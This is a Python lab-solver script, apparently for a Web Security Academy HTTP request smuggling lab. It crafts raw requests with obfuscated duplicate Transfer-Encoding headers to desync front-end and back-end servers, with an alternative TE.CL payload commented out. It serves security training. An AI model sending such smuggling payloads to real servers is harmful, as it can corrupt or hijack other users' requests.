from web_security_academy.core.logger import logger
from urllib.parse import urlparse


def solve_lab(session):
    hostname = urlparse(session.url).hostname

    # Explanation: The front-end server only takes the first value of duplicate
    # HTTP headers, while the back-end server takes the last value. Therefore,
    # the following headers will incude the front-end server to not process the
    # Transfer-Encoding header:

    # Transfer-Encoding: x
    # Transfer-Encoding: chunked

    # The remainder of the attack will take the same form as the CL.TE
    # vulnerability. The headers can we switched around to craft an attack
    # taking the form of a TE.CL vulnerability

    smuggled_prefix = "G"

    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        f"Content-Length: {len(smuggled_prefix) + 5}\r\n"
        "Transfer-Encoding: x\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"{smuggled_prefix}"
    ).encode()

    session.send_raw(payload)
    logger.info("Prepended the letter G to the next request")

    resp = session.post_path("/")
    logger.info("Received the following response after sending POST request:")
    logger.info(resp.text)

    # smuggled_prefix = (
    #     "GPOST / HTTP/1.1\r\n"
    #     f"Host: {hostname}\r\n"
    #     "Content-Length: 6\r\n"
    #     "\r\n"
    #     "0\r\n"
    #     "\r\n"
    # )

    # # Chunk = hex(size(chunk body)) + newline + chunk body + newline
    # hexof_sizeof_first_chunk_body = f"{len(smuggled_prefix[:-7]):x}"

    # payload = (
    #     "POST / HTTP/1.1\r\n"
    #     f"Host: {hostname}\r\n"
    #     f"Content-Length: {len(hexof_sizeof_first_chunk_body) + 2}\r\n"
    #     "Transfer-Encoding: chunked\r\n"
    #     "Transfer-Encoding: x\r\n"
    #     "\r\n"
    #     f"{hexof_sizeof_first_chunk_body}\r\n"
    #     f"{smuggled_prefix}"
    # ).encode()

    # session.send_raw(payload)
    # logger.info("Prepended the following to the next request:")
    # print(smuggled_prefix, end="")

    # resp = session.get_path("/")
    # logger.info("Received the following response after sending HTTP request:")
    # logger.info(resp.text)
